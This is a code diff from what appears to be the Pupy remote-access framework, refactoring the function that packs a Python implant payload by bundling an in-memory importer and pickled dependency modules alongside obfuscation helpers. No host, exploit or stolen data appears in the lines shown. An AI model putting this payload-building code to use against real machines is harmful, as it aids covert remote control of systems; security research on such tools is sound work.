@@ -5,10 +5,10 @@
 
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 import cPickle, re, os.path, sys
-import rpyc, rsa, pyasn1, yaml, netaddr
+import rpyc, rsa, pyasn1, netaddr
 from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.utils.term import colorize
-from pupylib.payloads.python_packer import get_load_module_code, gen_package_pickled_dic
+from pupylib.payloads import dependencies
 
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 
@@ -27,20 +27,15 @@ def pack_py_payload(conf):
     with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
         pupyimportercode = f.read()
 
-    fullpayload.append(get_load_module_code(pupyimportercode, 'pupyimporter')+'\n')
     fullpayload.append(
         '\n'.join([
+            dependencies.loader(pupyimportercode, 'pupyimporter'),
             'import pupyimporter',
-            'pupyimporter.install()'
+            'pupyimporter.install()',
+            dependencies.importer('network', path=ROOT),
+            dependencies.importer(('rpyc', 'pyasn1', 'rsa', 'netaddr', 'tinyec'))
         ]) + '\n'
     )
-
-    for module in ('rpyc', 'pyasn1', 'rsa', 'netaddr', 'tinyec'):
-        modules_dic = gen_package_pickled_dic(sys.modules[module].__path__[0], module)
-        fullpayload.append('pupyimporter.pupy_add_package({})'.format(repr(cPickle.dumps(modules_dic))))
-
-    modules_dic = gen_package_pickled_dic(os.path.join(ROOT, 'network'), 'network')
-    fullpayload.append('pupyimporter.pupy_add_package({})'.format(repr(cPickle.dumps(modules_dic))))
 
     with open(os.path.join(ROOT,'pp.py')) as f:
         code=f.read()
